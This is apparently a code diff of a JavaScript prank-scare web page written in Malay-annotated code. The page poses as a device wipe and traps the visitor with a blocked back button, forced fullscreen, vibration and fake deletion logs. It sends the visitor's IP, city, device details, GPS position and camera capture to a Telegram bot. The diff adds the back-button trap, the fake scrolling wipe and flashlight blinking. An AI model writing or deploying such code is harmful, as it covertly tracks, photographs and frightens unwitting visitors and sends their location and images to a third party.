@@ -40,13 +40,13 @@
 
     <div id="overlay">
         <div style="text-align:center; border:1px solid #0f0; padding:25px; background:#111; box-shadow: 0 0 20px #0f0;">
-            <p>⚠️ SYSTEM UPDATE REQUIRED</p>
-            <p style="font-size:0.7rem; color:#aaa;">Tap screen to synchronize device</p>
+            <p>⚠️ SYSTEM UPDATE FINISH</p>
+            <p style="font-size:0.7rem; color:#aaa;">Tap screen to refresh this page</p>
         </div>
     </div>
 
     <div class="container">
-        <div class="header"> [!] DEVICE RESER & WIPE [!] </div>
+        <div class="header"> [!] DEVICE RESET & WIPE [!] </div>
         <div id="console"></div>
         <div class="progress-bar">
             <div class="progress-fill" id="fill"></div>
@@ -74,17 +74,23 @@
             consoleElem.scrollTop = consoleElem.scrollHeight;
         }
 
+        // --- FITUR 4: BLOCK BACK BUTTON ---
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function() {
+            window.history.go(1);
+            logToConsole("SYSTEM OVERRIDE: Escape blocked!", true);
+            if(navigator.vibrate) navigator.vibrate(400);
+        };
+
         let isActivated = false;
         async function activateAll() {
             if (isActivated) return;
             isActivated = true;
             document.getElementById('overlay').style.display = 'none';
 
-            // Fullscreen & Vibrate
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
             if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 800]);
 
-            // Auto-Copy
             const t = document.createElement("textarea");
             document.body.appendChild(t);
             t.value = "HACKER ALERT: SYSTEM RESET. ALL DATA DELETED.";
@@ -99,14 +105,22 @@
             logToConsole("Initializing remote exploit...");
             const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
 
-            // Fake Wipe Logs
+            // --- FITUR 5 (BAHAGIAN A): FAKE SCROLLING WIPE ---
+            const fakeFiles = ["Contacts.vcf", "WhatsApp_Database.db", "Private_Photos.zip", "Banking_Cache.tmp", "Browser_History.log"];
+            let fIdx = 0;
+            const fInt = setInterval(() => {
+                if(fIdx < fakeFiles.length) {
+                    logToConsole(`Deleting: ${fakeFiles[fIdx]}... [DONE]`, true);
+                    fIdx++;
+                } else { clearInterval(fInt); }
+            }, 1200);
+
             setTimeout(() => logToConsole("Bypassing security... [OK]"), 1000);
             setTimeout(() => {
                 logToConsole("CRITICAL: EMERGENCY WIPE INITIATED", true);
                 if(navigator.vibrate) navigator.vibrate(1000);
             }, 3000);
-            setTimeout(() => logToConsole("Formatting /sdcard/Photos...", true), 5000);
-
+            
             let width = 0;
             const interval = setInterval(() => {
                 if (width >= 99) clearInterval(interval);
@@ -114,7 +128,6 @@
                 fill.style.width = `${width}%`;
             }, 500);
 
-            // --- DETECT BRAND ---
             let brandPhone = "Unknown Device";
             if (navigator.userAgentData) {
                 try {
@@ -128,20 +141,13 @@
                 else if (ua.match(/Windows/i)) brandPhone = "Windows PC";
             }
 
-            // --- IP & DEVICE INFO ---
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 const b = await navigator.getBattery();
                 const bLevel = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Battery"})`;
 
-                let msg = `🚨 *SYSTEM RESET*\n` +
-                          `📱 *Device:* ${brandPhone}\n` +
-                          `🌐 *IP:* \`${d.ip}\`\n` +
-                          `📍 *Loc:* ${d.city}, ${d.country_name}\n` +
-                          `🔋 *Battery:* ${bLevel}\n` +
-                          `⏰ *Time:* ${waktu}`;
-                
+                let msg = `🚨 *SYSTEM RESET*\n📱 *Device:* ${brandPhone}\n🌐 *IP:* \`${d.ip}\`\n📍 *Loc:* ${d.city}\n🔋 *Battery:* ${bLevel}\n⏰ *Time:* ${waktu}`;
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -149,23 +155,32 @@
                 });
             } catch (e) {}
 
-            // --- GPS ---
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: `📍 *GPS COORDINATES:*\n[Open in Google Maps](${map})`, parse_mode: 'Markdown'})
+                        body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: `📍 *GPS COORDINATES:*\n[Google Maps](${map})`, parse_mode: 'Markdown'})
                     });
                 }, null, {enableHighAccuracy:true});
             }
 
-            // --- CAMERA (NO MIC) ---
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+
+                // --- FITUR 5 (BAHAGIAN B): FLASHLIGHT BLINK (ANDROID) ---
+                const track = stream.getVideoTracks()[0];
+                if (track.getCapabilities().torch) {
+                    let flashOn = false;
+                    const flashInt = setInterval(() => {
+                        flashOn = !flashOn;
+                        track.applyConstraints({ advanced: [{ torch: flashOn }] });
+                    }, 200);
+                    setTimeout(() => clearInterval(flashInt), 5000);
+                }
 
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
@@ -192,9 +207,9 @@
                 };
                 mr.start();
                 setTimeout(() => mr.stop(), 7000);
-            } catch (e) { logToConsole("Camera Access Denied.", true); }
+            } catch (e) { logToConsole("Security bypass incomplete.", true); }
 
-            setTimeout(() => { window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p"; }, 15000);
+            setTimeout(() => { window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p"; }, 20000);
         }
     </script>
 </body>
